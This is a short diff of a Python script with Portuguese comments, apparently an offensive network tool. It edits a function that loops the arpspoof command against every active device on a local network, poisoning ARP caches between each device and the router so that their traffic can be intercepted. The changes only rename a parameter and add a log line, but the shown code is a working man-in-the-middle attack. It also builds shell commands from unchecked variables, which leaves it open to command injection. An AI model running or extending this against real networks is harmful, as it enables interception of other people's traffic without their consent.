@@ -26,7 +26,7 @@ def verificar_host(ip):
         print(f"[!] Erro ao verificar host {ip}: {erro}")
         return False
 
-def executar_arp_spoof(interface, dispositivos, ip_local):
+def executar_arp_spoof(interface, dispositivos_ativos, ip_local):
     """
     Realiza ARP Spoofing para os dispositivos detectados na rede.
     Cria threads para enviar pacotes de ARP entre o roteador e os dispositivos ativos.
@@ -38,10 +38,11 @@ def executar_arp_spoof(interface, dispositivos, ip_local):
         """Executa o comando arpspoof indefinidamente."""
         comando = f"sudo arpspoof -i {interface} -t {ip_origem} {ip_destino}"
         while True:
+            print(f"[*] ARP Reply enviado de {ip_origem} para {ip_destino}")
             os.system(f"{comando} > /dev/null 2>&1")
 
     threads = []
-    for ip_alvo in dispositivos:
+    for ip_alvo in dispositivos_ativos:
         if ip_alvo == ip_local or ip_alvo == ip_roteador:
             continue
 
